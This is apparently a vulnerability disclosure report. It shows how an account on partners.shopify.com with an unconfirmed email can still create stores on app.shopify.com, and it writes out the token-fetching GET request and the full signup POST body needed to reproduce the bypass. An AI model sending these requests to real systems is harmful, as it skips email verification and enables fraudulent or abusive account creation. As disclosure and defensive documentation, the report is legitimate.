Apparently they can leverage an issue on partners.shopify.com to create stores on app.shopify.com without confirming their email address.\n\nSetup\n1. A new test account on partners.shopify.com.\n2. Don't confirm email after signing up.\n3. A partner account ID - say 1234\n4. Shop name - say attacker\n\nStep to reproduce.\n1. While logged in send the following to the server to obtain an access token\nGET /1234/stores/signup_object/dev_store \nHost: partners.shopify.com\n2. You should get a request similar to {\"extra\":{\"affiliate_shop\":\"eyJfcmFpbHMiOnsibWVzc2FnZSI6ImV5SndiR0Z1WDNOd1pXTWlPbn.....\"},\"signup_source\":\"development shop\",\"signup_types\":[\"affiliate_shop\"],\"previous_page\":\"https://partners.shopify.com/1234/stores\"}\n3. Finally, to create the shop, do the following:\nPOST /services/signup/create HTTP/1.1\nHost: app.shopify.com\n....\n\u003csnipped\u003e\n....\n_orig_referrer=https%3A%2F%2Fpartners.shopify.com%2F1234%2Fstores%2Fnew%3Fstore_type%3Ddev_store\n_y=\u0026ref=\u0026ssid=\u0026source=\u0026source_url=\u0026signup_code=\u0026signup_source=development+shop\u0026signup_source_details=build_store_for_client\u0026forwarded_host=\u0026signup_page=\u0026signup_locale=\u0026signup%5Bshop_name%5D=attacker\u0026signup%5Bsubdomain%5D=\u0026signup%5Bfirst_name%5D=\u0026signup%5Blast_name%5D=\u0026signup%5Bemail%5D=attacker%40domain.com\u0026signup%5Bpassword%5D={shop-password-here}\u0026signup%5Bconfirm_password%5D={shop_password_here}signup%5Baddress1%5D=Beverly+Hills\u0026signup%5Bcity%5D=Los+Angeles\u0026signup%5Bprovince%5D=CA\u0026signup%5Bzip%5D=90210\u0026signup%5Bcountry%5D=US\u0026signup%5Bphone%5D=\u0026signup%5Bpos%5D=\u0026signup%5Bextra%5D%5Baffiliate_shop%5D={access_token_here}\u0026signup%5Bextra%5D%5Borganization_id%5D=1234\u0026signup%5Bextra%5D%5Bpartner_test_shop%5D=\u0026signup%5Bsignup_types%5D%5B%5D=affiliate_shop\n\nNote: Every occurrence of \"1234\" should be replaced with the partner account ID created above.
